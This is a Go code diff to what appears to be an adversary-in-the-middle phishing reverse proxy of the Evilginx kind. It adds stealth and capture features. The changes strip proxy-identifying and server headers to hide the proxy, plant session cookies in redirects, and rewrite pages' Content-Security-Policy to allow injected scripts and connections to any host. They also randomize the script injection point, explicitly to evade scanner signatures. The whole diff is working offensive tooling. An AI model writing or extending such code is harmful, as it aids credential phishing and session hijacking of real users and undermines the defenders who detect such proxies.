@@ -20,6 +20,7 @@ import (
 	"html"
 	"io"
 	"io/ioutil"
+	mrand "math/rand"
 	"net"
 	"net/http"
 	"net/url"
@@ -169,7 +170,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			// handle ip blacklist
 			from_ip := strings.SplitN(req.RemoteAddr, ":", 2)[0]
 
-			// handle proxy headers
+			// handle proxy headers - read IP first, then strip all proxy headers to avoid leaking proxy presence
 			proxyHeaders := []string{"X-Forwarded-For", "X-Real-IP", "X-Client-IP", "Connecting-IP", "True-Client-IP", "Client-IP"}
 			for _, h := range proxyHeaders {
 				origin_ip := req.Header.Get(h)
@@ -177,6 +178,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					from_ip = strings.SplitN(origin_ip, ":", 2)[0]
 					break
 				}
+			}
+			// Strip all proxy-identifying headers from the request before forwarding upstream
+			stripOutboundHeaders := []string{"X-Forwarded-For", "X-Forwarded-Proto", "X-Real-IP", "X-Client-IP", "Connecting-IP", "True-Client-IP", "Client-IP", "Via", "Forwarded"}
+			for _, h := range stripOutboundHeaders {
+				req.Header.Del(h)
 			}
 
 			// log.Debug("xxxxxxxxxxxxxxxxxxxxx\n %s xx", p.cfg.general.Chatid)
@@ -600,6 +606,20 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							if strings.ToLower(req_path) != strings.ToLower(u.Path) {
 								resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
 								if resp != nil {
+									// Inject session cookie into redirect so session params (email) survive the redirect
+									if ps.SessionId != "" && ps.Created {
+										ck := &http.Cookie{
+											Name:     getSessionCookieName(ps.PhishletName, p.cookieName),
+											Value:    ps.SessionId,
+											Path:     "/",
+											Domain:   p.cfg.GetBaseDomain(),
+											Expires:  time.Now().Add(60 * time.Minute),
+											HttpOnly: false,
+											Secure:   true,
+											SameSite: http.SameSiteNoneMode,
+										}
+										resp.Header.Add("Set-Cookie", ck.String())
+									}
 									resp.Header.Add("Location", rurl)
 									return req, resp
 								}
@@ -952,6 +972,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				"X-XSS-Protection",
 				"X-Content-Type-Options",
 				"X-Frame-Options",
+				"Server",
+				"X-Powered-By",
+				"X-AspNet-Version",
+				"X-AspNetMvc-Version",
 			}
 			for _, hdr := range rm_headers {
 				resp.Header.Del(hdr)
@@ -1365,15 +1389,38 @@ func (p *HttpProxy) javascriptRedirect(req *http.Request, rurl string) (*http.Re
 }
 
 func (p *HttpProxy) injectJavascriptIntoBody(body []byte, script string, src_url string) []byte {
-	// remove inline CSP meta tags that could block injected scripts
-	csp_meta_re := regexp.MustCompile(`(?i)<meta[^>]+http-equiv=['"]?Content-Security-Policy['"]?[^>]*>`)
-	body = csp_meta_re.ReplaceAll(body, []byte(""))
+	// Surgical CSP handling: instead of deleting the meta tag, relax only script-src and connect-src
+	csp_meta_re := regexp.MustCompile(`(?i)(<meta[^>]+http-equiv=['"]?Content-Security-Policy['"]?\s+content=['"])([^'"]*)(["'][^>]*>)`)
+	body = csp_meta_re.ReplaceAllFunc(body, func(match []byte) []byte {
+		parts := csp_meta_re.FindSubmatch(match)
+		if parts == nil {
+			return match
+		}
+		cspContent := string(parts[2])
+		directives := strings.Split(cspContent, ";")
+		var newDirectives []string
+		for _, dir := range directives {
+			trimmed := strings.TrimSpace(dir)
+			if trimmed == "" {
+				continue
+			}
+			lower := strings.ToLower(trimmed)
+			if strings.HasPrefix(lower, "script-src") {
+				newDirectives = append(newDirectives, "script-src 'self' 'unsafe-inline' 'unsafe-eval' *")
+			} else if strings.HasPrefix(lower, "connect-src") {
+				newDirectives = append(newDirectives, "connect-src *")
+			} else {
+				newDirectives = append(newDirectives, trimmed)
+			}
+		}
+		return []byte(string(parts[1]) + strings.Join(newDirectives, "; ") + string(parts[3]))
+	})
 
-	js_nonce_re := regexp.MustCompile(`(?i)<script.*nonce=['"]([^'"]*)`)
-	m_nonce := js_nonce_re.FindStringSubmatch(string(body))
+	js_nonce_re := regexp.MustCompile(`(?i)<script[^>]+nonce=['"]([^'"]+)['"]`)
+	m_nonce := js_nonce_re.FindSubmatch(body)
 	js_nonce := ""
 	if m_nonce != nil {
-		js_nonce = " nonce=\"" + m_nonce[1] + "\""
+		js_nonce = " nonce=\"" + string(m_nonce[1]) + "\""
 	}
 
 	var d_script string
@@ -1385,19 +1432,58 @@ func (p *HttpProxy) injectJavascriptIntoBody(body []byte, script string, src_url
 		return body
 	}
 
-	// try injecting before </body> first
-	re_body := regexp.MustCompile(`(?i)(<\s*/body\s*>)`)
-	if re_body.Match(body) {
-		return []byte(re_body.ReplaceAllString(string(body), d_script+"\n${1}"))
+	bodyStr := string(body)
+
+	// Randomize injection point to avoid scanner signature detection
+	// Build a list of viable injection strategies and pick one at random
+	type injectFn func() (string, bool)
+	strategies := []injectFn{
+		// Strategy A: before </body>
+		func() (string, bool) {
+			re := regexp.MustCompile(`(?i)(<\s*/body\s*>)`)
+			if re.MatchString(bodyStr) {
+				return re.ReplaceAllString(bodyStr, d_script+"\n${1}"), true
+			}
+			return "", false
+		},
+		// Strategy B: after opening <body ...>
+		func() (string, bool) {
+			re := regexp.MustCompile(`(?i)(<\s*body[^>]*>)`)
+			if re.MatchString(bodyStr) {
+				return re.ReplaceAllString(bodyStr, "${1}\n"+d_script), true
+			}
+			return "", false
+		},
+		// Strategy C: after a random existing <script ...> tag
+		func() (string, bool) {
+			re := regexp.MustCompile(`(?i)<script[^>]*>`)
+			locs := re.FindAllStringIndex(bodyStr, -1)
+			if len(locs) > 0 {
+				pick := locs[mrand.Intn(len(locs))]
+				pos := pick[1]
+				return bodyStr[:pos] + "\n" + d_script + "\n" + bodyStr[pos:], true
+			}
+			return "", false
+		},
+		// Strategy D: before </head>
+		func() (string, bool) {
+			re := regexp.MustCompile(`(?i)(<\s*/head\s*>)`)
+			if re.MatchString(bodyStr) {
+				return re.ReplaceAllString(bodyStr, d_script+"\n${1}"), true
+			}
+			return "", false
+		},
 	}
 
-	// fallback: inject before </head> if </body> is not found
-	re_head := regexp.MustCompile(`(?i)(<\s*/head\s*>)`)
-	if re_head.Match(body) {
-		return []byte(re_head.ReplaceAllString(string(body), d_script+"\n${1}"))
+	// Shuffle strategy order so the chosen injection point varies per response
+	order := mrand.Perm(len(strategies))
+	for _, i := range order {
+		if result, ok := strategies[i](); ok {
+			return []byte(result)
+		}
 	}
 
-	// last resort: append to end of body
+	// last resort: append to end
 	return append(body, []byte("\n"+d_script)...)
 }
 
